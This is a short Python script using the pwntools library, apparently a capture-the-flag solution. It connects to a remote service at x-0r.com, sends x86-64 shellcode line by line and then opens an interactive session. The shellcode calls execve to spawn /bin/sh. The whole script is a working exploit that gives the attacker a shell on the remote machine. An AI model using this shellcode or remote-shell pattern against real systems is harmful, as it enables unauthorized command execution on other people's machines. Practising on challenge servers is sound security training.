from pwn import *

r = remote('x-0r.com', 5012)

shellcode = """
    xor rdi, rdi
    push rdi
    mov rbx, 0x68732f6e69622f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    syscall
"""

r.recvuntil(b'> ')

for line in shellcode.strip().splitlines():
    r.sendline(line.strip().encode())
    r.recvuntil(b'> ')

r.sendline(b'')

r.interactive()
